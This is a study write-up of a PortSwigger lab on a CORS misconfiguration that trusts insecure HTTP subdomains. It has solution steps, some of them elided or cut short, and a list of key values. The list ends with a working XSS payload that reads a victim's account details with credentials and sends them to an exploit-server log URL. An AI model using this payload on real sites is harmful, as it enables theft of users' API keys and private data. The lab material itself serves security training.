# Lab: CORS vulnerability with trusted insecure protocols

**Official PortSwigger URL:** https://portswigger.net/web-security/cors/lab-breaking-https-attack

**Lab idea:** The challenge explores a CORS trust rule that accepts a subdomain regardless of whether it uses a secure protocol. It practices assessing how an insecurely served trusted origin can weaken the confidentiality of sensitive cross-origin data.

## Vulnerability in brief
Cross-origin resource sharing (CORS) is a browser mechanism that lets a server selectively permit web pages from other origins to read its resources. It relaxes the same-origin policy (SOP), which otherwise restricts cross-origin access to responses. CORS is a security-sensitive trust configuration, not a general defense against cross-site request forgery (CSRF).

## Solution idea
1. Check intercept is off, then use Burp's browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it…
3. Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
4. Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
- …
6. Click View exploit .
7. Go back to the exploit server and click Deliver exploit to victim .
8. Click Access log , retrieve and submit the victim's API key to complete the lab.

## Payloads / key values
- `/accountDetails`
- `Access-Control-Allow-Credentials`
- `Origin: http://subdomain.lab-id`
- `lab-id`
- `Access-Control-Allow-Origin`
- `productID`
- `YOUR-LAB-ID`
- `YOUR-EXPLOIT-SERVER-ID`
- `<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>`

## Official source
- [PortSwigger Academy: Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
